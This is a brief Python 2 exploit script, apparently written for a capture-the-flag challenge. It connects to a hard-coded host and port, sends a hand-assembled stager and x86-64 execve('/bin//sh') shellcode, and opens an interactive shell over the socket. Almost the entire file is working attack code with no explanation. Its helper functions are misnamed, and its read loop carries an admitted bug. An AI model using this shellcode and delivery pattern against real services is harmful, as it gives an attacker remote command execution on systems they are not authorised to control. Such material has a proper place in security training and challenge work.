import struct
import telnetlib
from socket import *

p8 = lambda x : struct.pack("<L", x)
p16 = lambda x : struct.pack("<Q", x)

def ReadUntil(s, chkStr, isPrint = True) :
    chkLen = len(chkStr)
    data = s.recv(1)
    while True :
        while data[-1] != chkStr[0] :
            data += s.recv(1)
        tem = s.recv(chkLen - 1)
        data += tem
        # tem possible part of chkStr
        # need to fix
        if tem == chkStr[1:] :
            break
        
    if isPrint :
        print data

HOST = "10.0.66.72"
PORT = 6611

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

#exploit!

# mov edx, 0x50
# mov eax, 0x40061c
# call rax
payload = "\xBA\x50\x00\x00\x00\xB8\x1C\x06\x40\x00\xFF\xD0"

shellcode = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"

s.send(payload + "\n")
s.send(shellcode + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
